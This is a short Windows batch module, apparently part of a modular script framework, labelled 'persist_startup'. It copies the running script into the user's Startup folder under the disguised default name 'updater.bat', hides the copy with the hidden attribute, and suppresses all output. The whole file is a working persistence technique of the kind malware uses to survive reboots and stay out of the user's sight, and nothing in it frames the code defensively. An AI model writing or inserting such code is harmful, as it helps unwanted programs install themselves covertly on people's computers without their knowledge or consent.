REM provides: persist_startup
REM depends: (none)
REM description: Copy script to user startup folder for persistence

if not defined PERSIST_NAME set "PERSIST_NAME=updater.bat"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

copy /y "%~f0" "%STARTUP_DIR%\%PERSIST_NAME%" >nul 2>nul
attrib +h "%STARTUP_DIR%\%PERSIST_NAME%" >nul 2>nul
